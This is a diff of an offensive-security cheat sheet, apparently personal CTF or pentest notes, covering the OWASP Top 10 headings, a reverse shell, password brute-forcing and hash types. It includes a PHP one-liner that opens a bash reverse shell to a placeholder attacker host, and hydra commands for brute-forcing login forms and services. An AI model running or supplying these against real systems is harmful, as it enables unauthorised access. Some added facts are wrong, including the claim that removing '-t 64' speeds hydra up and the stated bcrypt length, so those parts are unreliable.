@@ -97,32 +97,43 @@ USER or PASS to connect
 you can use ls and get FILENAME
 ```
 ### 3. Exploit
-#### TOP 10 OWASP
-##### Top 1 Broken acces control
-##### Top 2 Cryptographics errors
-##### Top 3 injection breach
-##### Top 4 non-secure application
-##### Top 5 bad configuration
-##### Top 6 composant vulnerability
-##### Top 7 authentification failure
-##### Top 8 failure integrity data
-##### Top 9 journalisation defect
-##### Top 10 SSRF breach
-#### Reverse shell
+#### 3.1 TOP 10 OWASP
+- important site recap [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html)  
+  ##### Top 1 Broken acces control
+  ##### Top 2 Cryptographic failures
+  ##### Top 3 injection breach
+  ##### Top 4 non-secure application
+  ##### Top 5 bad configuration
+  ##### Top 6 composant vulnerability
+  ##### Top 7 authentification failure
+  ##### Top 8 failure integrity data
+  ##### Top 9 journalisation defect
+  ##### Top 10 SSRF breach
+#### 3.2 Reverse shell
 - reverse shell linux [hacktricks.xyz/reverse-shells/linux](https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/linux)
 ```php
 <?php exec("/bin/bash -c 'bash -i > /dev/tcp/ATTACKING-IP/1234 0>&1'");
 #simple balise php
 ```
-#### Password bruteforce
+#### 3.3 Password bruteforce
 - before bruteforce prefer to find a valid username because combination of bruteforce username and password is very very long
 ```bash
 hydra -l <username> -P /usr/share/worldist.txt <IP address> http-post-form "/login:login=^USER^&password=^PASS^:message_erreur" #header parameters
 #allow to brutforce http page
 hydra -s <port> -l <username> -P /usr/share/worldist.txt -t 64 -vV -f <protocol>://<adresse IP>
-#syntax of hydra
+#syntax of hydra, for more speed remove -t 64
 ```
-#### hashcracking
+#### 3.4 Hashcracking
+- Popular type of hash :
+```test
+MD5: 32-character hexadecimal hash, often used for file integrity and password storage.
+SHA-1: 40-character hexadecimal hash, commonly used for digital signatures and password storage.
+SHA-256: 64-character hexadecimal hash, widely used for cryptographic purposes, including password storage and digital signatures.
+bcrypt: Variable-length hash, typically 22-34 characters long, with a salt value and a work factor (iterations).
+PBKDF2: Variable-length hash, typically 32-64 characters long, with a salt value and a work factor (iterations).
+Argon2: Variable-length hash, typically 32-64 characters long, with a salt value and a work factor (iterations).
+```
+- hascat
 ### 4. escalation privilege LINUX
 - You need to search about kernel version, user and group, services, logs, host directory,.... 
 - see the important location file in documents of this page
